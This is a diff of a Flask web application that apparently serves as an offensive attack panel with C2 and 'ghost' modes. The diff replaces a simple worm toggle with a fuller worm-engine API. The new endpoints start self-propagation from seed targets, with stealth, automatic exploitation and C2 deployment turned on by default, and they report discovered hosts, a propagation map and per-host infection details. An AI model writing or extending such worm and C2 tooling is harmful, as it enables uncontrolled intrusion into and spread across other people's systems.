@@ -3290,33 +3290,6 @@ def api_ghost_status():
         return jsonify({'active': False, 'error': str(e)})
 
 # ============================================================
-# WORM MODE ENDPOINTS
-# ============================================================
-@app.route('/api/worm/toggle', methods=['POST'])
-@login_required
-def api_worm_toggle():
-    """Toggle Worm Mode on/off."""
-    data = request.get_json() or {}
-    target = data.get('target', '')
-    try:
-        if worm_engine.active:
-            result = worm_engine.stop()
-        else:
-            result = worm_engine.start(target)
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'active': worm_engine.active, 'error': str(e)})
-
-@app.route('/api/worm/status', methods=['GET'])
-@login_required
-def api_worm_status():
-    """Get Worm Mode status."""
-    try:
-        return jsonify(worm_engine.get_status())
-    except Exception as e:
-        return jsonify({'active': False, 'error': str(e)})
-
-# ============================================================
 # MULTI-CHANNEL C2 ENDPOINTS
 # ============================================================
 @app.route('/api/c2/status', methods=['GET'])
@@ -3411,6 +3384,86 @@ def api_multi_compare():
     if not url1 or not url2:
         return jsonify({'error': 'Both url1 and url2 required'}), 400
     return jsonify(multi_target.compare_scans(url1, url2))
+
+# ============================================================
+# WORM ENGINE ENDPOINTS
+# ============================================================
+
+@app.route('/api/worm/activate', methods=['POST'])
+@login_required
+def api_worm_activate():
+    """Activate worm mode — begin self-propagation from seed targets."""
+    data = request.get_json()
+    seed_targets = data.get('targets', [])
+    if isinstance(seed_targets, str):
+        seed_targets = [seed_targets]
+    if not seed_targets:
+        return jsonify({'error': 'At least one seed target required'}), 400
+    
+    options = {
+        'max_depth': data.get('max_depth', 3),
+        'max_hosts': data.get('max_hosts', 50),
+        'stealth': data.get('stealth', True),
+        'deploy_c2': data.get('deploy_c2', True),
+        'auto_exploit': data.get('auto_exploit', True),
+        'scan_type': data.get('scan_type', 'stealth'),
+        'propagation_delay': data.get('propagation_delay', 5),
+    }
+    
+    # Set up callback for live feed
+    def worm_callback(message, msg_type='worm'):
+        emit_feed('worm', message, msg_type)
+    
+    worm_engine.set_callback(worm_callback)
+    worm_engine.set_socketio(socketio)
+    
+    result = worm_engine.activate(seed_targets, options)
+    return jsonify(result)
+
+@app.route('/api/worm/deactivate', methods=['POST'])
+@login_required
+def api_worm_deactivate():
+    """Deactivate worm mode."""
+    result = worm_engine.deactivate()
+    return jsonify(result)
+
+@app.route('/api/worm/status', methods=['GET'])
+@login_required
+def api_worm_status():
+    """Get worm engine status."""
+    return jsonify(worm_engine.get_status())
+
+@app.route('/api/worm/configure', methods=['POST'])
+@login_required
+def api_worm_configure():
+    """Configure worm engine parameters."""
+    data = request.get_json()
+    result = worm_engine.configure(
+        max_depth=data.get('max_depth', 3),
+        max_hosts=data.get('max_hosts', 50),
+    )
+    return jsonify(result)
+
+@app.route('/api/worm/map', methods=['GET'])
+@login_required
+def api_worm_map():
+    """Get propagation map for visualization."""
+    return jsonify(worm_engine.get_propagation_map())
+
+@app.route('/api/worm/hosts', methods=['GET'])
+@login_required
+def api_worm_hosts():
+    """Get all discovered hosts."""
+    return jsonify(worm_engine.get_discovered_hosts())
+
+@app.route('/api/worm/host', methods=['GET'])
+@login_required
+def api_worm_host_detail():
+    """Get infection details for a specific host."""
+    host = request.args.get('host', '')
+    if not host:
+        return jsonify({'error': 'Host parameter required'}), 400
+    return jsonify(worm_engine.get_infection_details(host) or {'error': 'Host not found'})
 
 @socketio.on('connect')
 def handle_connect():
